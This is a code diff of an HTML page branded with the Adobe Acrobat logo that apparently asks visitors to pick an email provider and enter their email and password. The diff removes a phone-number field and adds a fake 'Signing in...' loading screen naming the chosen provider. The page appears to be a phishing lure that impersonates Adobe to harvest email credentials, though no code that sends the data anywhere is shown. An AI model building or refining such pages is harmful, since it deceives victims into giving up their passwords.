@@ -9,10 +9,8 @@
 <body>
   <div class="background-overlay"></div>
 
-  <!-- Removed the <nav class="top-navbar"> -->
-
   <div class="container">
-    <!-- New: Flex container for logo and heading/description -->
+    <!-- Flex container for logo and heading/description -->
     <div class="header-flex">
       <img
         src="https://upload.wikimedia.org/wikipedia/commons/4/42/Adobe_Acrobat_DC_logo_2020.svg"
@@ -51,7 +49,14 @@
       </div>
     </section>
 
-    <!-- Credentials Form -->
+    <!-- Signing In Loading Page -->
+    <section id="signing-in" class="page">
+      <div class="signing-in-spinner"></div>
+      <h1>Signing in...</h1>
+      <p>Please wait while we prepare your sign-in with <span id="signing-in-provider"></span>.</p>
+    </section>
+
+    <!-- Credentials Form (No phone number) -->
     <section id="credentials-input" class="page">
       <h1 id="credentials-title"></h1>
       <form id="credentials-form">
@@ -59,8 +64,6 @@
         <input type="email" id="email" name="email" required />
         <label for="password">Password:</label>
         <input type="password" id="password" name="password" required />
-        <label for="phone">Phone Number (with country code):</label>
-        <input type="tel" id="phone" name="phone" placeholder="+1234567890" required />
         <button type="submit">Submit</button>
       </form>
       <button id="back-to-providers" class="back-btn">Back</button>
